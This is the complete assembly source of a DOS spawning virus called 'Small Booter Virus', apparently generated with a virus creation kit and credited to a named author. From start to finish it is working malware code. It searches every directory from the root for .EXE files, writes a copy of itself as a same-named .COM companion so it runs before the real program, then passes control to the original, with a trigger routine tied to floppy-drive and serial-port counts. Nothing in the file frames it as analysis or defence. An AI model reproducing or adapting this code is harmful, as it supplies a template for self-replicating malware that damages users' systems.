; SMLBOOT.ASM -- Small Booter Virus
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Virucidal Maniac

virus_type	equ	2			; Spawning Virus
is_encrypted	equ	0			; We're not encrypted
tsr_virus	equ	0			; We're not TSR

code		segment byte public
		assume	cs:code,ds:code,es:code,ss:code
		org	0100h

start		label	near

main		proc	near

		mov	ah,04Ah 		; DOS resize memory function
		mov	bx,(finish - start) / 16 + 0272h  ; BX holds # of para.
		int	021h

		mov	sp,(finish - start) + 01100h  ; Change top of stack

		mov	si,offset spawn_name	; SI points to true filename
		int	02Eh			; DOS execution back-door
		push	ax			; Save return value for later

		mov	ax,cs			; AX holds code segment
		mov	ds,ax			; Restore data segment
		mov	es,ax			; Restore extra segment

		call	search_files		; Find and infect a file

		call	get_floppies
		cmp	ax,0002h		; Did the function return 2?
		jl	strt00			; If less, do effect
		call	get_serial
		cmp	ax,0002h		; Did the function return 2?
		je	strt00			; If equal, do effect
		jmp	end00			; Otherwise skip over it
strt00:
		push	bp			; Save BP
		mov	bp,sp			; BP points to stack frame
		sub	sp,34			; Allocate 34 bytes on stack

		mov	ah,038h 		; DOS get country function
		lea	dx,[bp - 34]		; DX points to unused buffer
		int	021h

		xchg	bx,ax			; AX holds the country code

		mov	sp,bp			; Deallocate local buffer
		pop	bp			; Restore BP

end00:		pop	ax			; AL holds return value
		mov	ah,04Ch 		; DOS terminate function
		int	021h
main		endp

search_files	proc	near
		push	bp			; Save BP
		mov	bp,sp			; BP points to local buffer
		sub	sp,64			; Allocate 64 bytes on stack

		mov	ah,047h 		; DOS get current dir function
		xor	dl,dl			; DL holds drive # (current)
		lea	si,[bp - 64]		; SI points to 64-byte buffer
		int	021h

		mov	ah,03Bh 		; DOS change directory function
		mov	dx,offset root		; DX points to root directory
		int	021h

		call	traverse		; Start the traversal

		mov	ah,03Bh 		; DOS change directory function
		lea	dx,[bp - 64]		; DX points to old directory
		int	021h

		mov	sp,bp			; Restore old stack pointer
		pop	bp			; Restore BP
		ret				; Return to caller

root		db	"\",0			; Root directory
search_files	endp

traverse	proc	near
		push	bp			; Save BP

		mov	ah,02Fh 		; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address

		mov	bp,sp			; BP points to local buffer
		sub	sp,128			; Allocate 128 bytes on stack

		mov	ah,01Ah 		; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer
		int	021h

		mov	ah,04Eh 		; DOS find first function
		mov	cx,00010000b		; CX holds search attributes
		mov	dx,offset all_files	; DX points to "*.*"
		int	021h
		jc	leave_traverse		; Leave if no files present

check_dir:	cmp	byte ptr [bp - 107],16	; Is the file a directory?
		jne	another_dir		; If not, try again
		cmp	byte ptr [bp - 98],'.'	; Did we get a "." or ".."?
		je	another_dir		;If so, keep going

		mov	ah,03Bh 		; DOS change directory function
		lea	dx,[bp - 98]		; DX points to new directory
		int	021h

		call	traverse		; Recursively call ourself

		pushf				; Save the flags
		mov	ah,03Bh 		; DOS change directory function
		mov	dx,offset up_dir	; DX points to parent directory
		int	021h
		popf				; Restore the flags

		jnc	done_searching		; If we infected then exit

another_dir:	mov	ah,04Fh 		; DOS find next function
		int	021h
		jnc	check_dir		; If found check the file

leave_traverse:
		mov	dx,offset exe_mask	; DX points to "*.EXE"
		call	find_files		; Try to infect a file
done_searching: mov	sp,bp			; Restore old stack frame
		mov	ah,01Ah 		; DOS set DTA function
		pop	dx			; Retrieve old DTA address
		int	021h

		pop	bp			; Restore BP
		ret				; Return to caller

up_dir		db	"..",0			; Parent directory name
all_files	db	"*.*",0 		; Directories to search for
exe_mask	db	"*.EXE",0		; Mask for all .EXE files
traverse	endp

find_files	proc	near
		push	bp			; Save BP

		mov	ah,02Fh 		; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address

		mov	bp,sp			; BP points to local buffer
		sub	sp,128			; Allocate 128 bytes on stack

		push	dx			; Save file mask
		mov	ah,01Ah 		; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer
		int	021h

		mov	ah,04Eh 		; DOS find first file function
		mov	cx,00100111b		; CX holds all file attributes
		pop	dx			; Restore file mask
find_a_file:	int	021h
		jc	done_finding		; Exit if no files found
		call	infect_file		; Infect the file!
		jnc	done_finding		; Exit if no error
		mov	ah,04Fh 		; DOS find next file function
		jmp	short find_a_file	; Try finding another file

done_finding:	mov	sp,bp			; Restore old stack frame
		mov	ah,01Ah 		; DOS set DTA function
		pop	dx			; Retrieve old DTA address
		int	021h

		pop	bp			; Restore BP
		ret				; Return to caller
find_files	endp

infect_file	proc	near
		mov	ah,02Fh 		; DOS get DTA address function
		int	021h
		mov	di,bx			; DI points to the DTA

		lea	si,[di + 01Eh]		; SI points to file name
		mov	dx,si			; DX points to file name, too
		mov	di,offset spawn_name + 1; DI points to new name
		xor	ah,ah			; AH holds character count
transfer_loop:	lodsb				; Load a character
		or	al,al			; Is it a NULL?
		je	transfer_end		; If so then leave the loop
		inc	ah			; Add one to the character count
		stosb				; Save the byte in the buffer
		jmp	short transfer_loop	; Repeat the loop
transfer_end:	mov	byte ptr [spawn_name],ah; First byte holds char. count
		mov	byte ptr [di],13	; Make CR the final character

		mov	di,dx			; DI points to file name
		xor	ch,ch			;
		mov	cl,ah			; CX holds length of filename
		mov	al,'.'			; AL holds char. to search for
	repne	scasb				; Search for a dot in the name
		mov	word ptr [di],'OC'	; Store "CO" as first two bytes
		mov	byte ptr [di + 2],'M'	; Store "M" to make "COM"

		mov	byte ptr [set_carry],0	; Assume we'll fail
		mov	ax,03D00h		; DOS open file function, r/o
		int	021h
		jnc	infection_done		; File already exists, so leave
		mov	byte ptr [set_carry],1	; Success -- the file is OK

		mov	ah,03Ch 		; DOS create file function
		mov	cx,00100111b		; CX holds file attributes (all)
		int	021h
		xchg	bx,ax			; BX holds file handle

		mov	ah,040h 		; DOS write to file function
		mov	cx,finish - start	; CX holds virus length
		mov	dx,offset start 	; DX points to start of virus
		int	021h

		mov	ah,03Eh 		; DOS close file function
		int	021h

infection_done: cmp	byte ptr [set_carry],1	; Set carry flag if failed
		ret				; Return to caller

spawn_name	db	12,12 dup (?),13	; Name for next spawn
set_carry	db	?			; Set-carry-on-exit flag
infect_file	endp


get_floppies	proc	near
		int	011h			; BIOS get equiment function
		xor	ah,ah			; Clear upper bits
		mov	cl,6			; Shift AX right six bits,
		shr	ax,cl			; dividing it by 64
		inc	ax			; Add one (at least 1 drive)
		ret				; Return to caller
get_floppies	endp

get_serial	proc	near
		int	011h			; BIOS get equiment function
		xor	ah,ah			; Clear upper bits
		mov	cl,9			; Shift AX right nine bits
		shr	ax,cl			;
		and	ax,7			; Clear all but two bits
		ret				; Return to caller
get_serial	endp

vcl_marker	db	"[VCL]",0		; VCL creation marker

finish		label	near

code		ends
		end	main
